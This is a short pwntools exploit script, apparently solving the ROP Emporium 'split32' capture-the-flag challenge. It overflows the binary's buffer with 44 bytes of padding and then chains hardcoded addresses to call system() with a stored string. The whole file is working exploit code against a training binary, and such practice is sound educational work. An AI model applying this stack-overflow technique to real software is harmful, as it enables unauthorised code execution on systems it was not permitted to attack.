from pwn import process, gdb, p32   # type: ignore

'''target = gdb.debug(
    './split32',
    gdbscript='b *0x804860a'
)'''
target = process('./split32')

usefulString = p32(0x0804a030)
push_eax = p32(0x80484f7)
ret = p32(0x0804837e)
system = p32(0x804861a)

payload = b''
payload += b'A' * 44
payload += system
payload += usefulString #b'B' * 4
payload += ret
target.sendline(payload)
target.interactive()
